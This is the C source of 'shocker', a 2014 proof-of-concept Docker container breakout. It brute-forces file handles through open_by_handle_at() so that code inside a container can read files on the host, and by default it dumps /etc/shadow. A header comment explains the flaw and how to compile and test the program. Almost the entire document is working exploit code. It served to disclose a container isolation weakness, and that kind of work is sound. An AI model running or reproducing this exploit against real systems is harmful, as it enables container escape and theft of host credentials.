/* shocker: docker PoC VMM-container breakout (C) 2014 Sebastian Krahmer
 *
 * Demonstrates that any given docker image someone is asking
 * you to run in your docker setup can access ANY file on your host,
 * e.g. dumping hosts /etc/shadow or other sensitive info, compromising
 * security of the host and any other docker VM's on it.
 *
 * docker using container based VMM: Sebarate pid and net namespace,
 * stripped caps and RO bind mounts into container's /. However
 * as its only a bind-mount the fs struct from the task is shared
 * with the host which allows to open files by file handles
 * (open_by_handle_at()). As we thankfully have dac_override and
 * dac_read_search we can do this. The handle is usually a 64bit
 * string with 32bit inodenumber inside (tested with ext4).
 * Inode of / is always 2, so we have a starting point to walk
 * the FS path and brute force the remaining 32bit until we find the
 * desired file (It's probably easier, depending on the fhandle export
 * function used for the FS in question: it could be a parent inode# or
 * the inode generation which can be obtained via an ioctl).
 * [In practise the remaining 32bit are all 0 :]
 *
 * tested with docker 0.11 busybox demo image on a 3.11 kernel:
 *
 * docker run -i busybox sh
 *
 * seems to run any program inside VMM with UID 0 (some caps stripped); if
 * user argument is given, the provided docker image still
 * could contain +s binaries, just as demo busybox image does.
 *
 * PS: You should also seccomp kexec() syscall :)
 * PPS: Might affect other container based compartments too
 *
 * $ cc -Wall -std=c99 -O2 shocker.c -static
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>


struct my_file_handle {
	unsigned int handle_bytes;
	int handle_type;
	unsigned char f_handle[8];
};



void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


void dump_handle(const struct my_file_handle *h)
{
	fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
	        h->handle_type);
	for (int i = 0; i < h->handle_bytes; ++i) {
		fprintf(stderr,"0x%02x", h->f_handle[i]);
		if ((i + 1) % 20 == 0)
			fprintf(stderr,"\n");
		if (i < h->handle_bytes - 1)
			fprintf(stderr,", ");
	}
	fprintf(stderr,"};\n");
}


int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
	int fd;
	uint32_t ino = 0;
	struct my_file_handle outh = {
		.handle_bytes = 8,
		.handle_type = 1
	};
	DIR *dir = NULL;
	struct dirent *de = NULL;

	path = strchr(path, '/');

	// recursion stops if path has been resolved
	if (!path) {
		memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
		oh->handle_type = 1;
		oh->handle_bytes = 8;
		return 1;
	}
	++path;
	fprintf(stderr, "[*] Resolving '%s'\n", path);

	if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
		die("[-] open_by_handle_at");

	if ((dir = fdopendir(fd)) == NULL)
		die("[-] fdopendir");

	for (;;) {
		de = readdir(dir);
		if (!de)
			break;
		fprintf(stderr, "[*] Found %s\n", de->d_name);
		if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
			fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
			ino = de->d_ino;
			break;
		}
	}

	fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");


	if (de) {
		for (uint32_t i = 0; i < 0xffffffff; ++i) {
			outh.handle_bytes = 8;
			outh.handle_type = 1;
			memcpy(outh.f_handle, &ino, sizeof(ino));
			memcpy(outh.f_handle + 4, &i, sizeof(i));

			if ((i % (1<<20)) == 0)
				fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
			if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
				closedir(dir);
				close(fd);
				dump_handle(&outh);
				return find_handle(bfd, path, &outh, oh);
			}
		}
	}

	closedir(dir);
	close(fd);
	return 0;
}


int main(int argc, char **argv)
{
    char* srcPath = argv[1];
    if (!srcPath) {
        srcPath = "/.dockerinit";
    }
    char* targetPath = argv[2];
    if (!targetPath) {
        targetPath = "/etc/shadow";
    }
	fprintf(stdout, "[!] SrcPath:\n%s\n", srcPath);
	fprintf(stdout, "[!] TargetPath:\n%s\n", targetPath);

	char buf[0x1000];
	int fd1, fd2;
	struct my_file_handle h;
	struct my_file_handle root_h = {
		.handle_bytes = 8,
		.handle_type = 1,
		.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
	};

	fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014             [***]\n"
	       "[***] The tea from the 90's kicks your sekurity again.     [***]\n"
	       "[***] If you have pending sec consulting, I'll happily     [***]\n"
	       "[***] forward to my friends who drink secury-tea too!      [***]\n");

	// get a FS reference from something mounted in from outside
	if ((fd1 = open(srcPath, O_RDONLY)) < 0)
		die("[-] open");

	if (find_handle(fd1, targetPath, &root_h, &h) <= 0)
		die("[-] Cannot find valid handle!");

	fprintf(stderr, "[!] Got a final handle!\n");
	dump_handle(&h);

	if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
		die("[-] open_by_handle");

	memset(buf, 0, sizeof(buf));
	if (read(fd2, buf, sizeof(buf) - 1) < 0)
		die("[-] read");

	fprintf(stderr, "[!] Win! %s output follows:\n%s\n", targetPath, buf);

	close(fd2); close(fd1);

	return 0;
}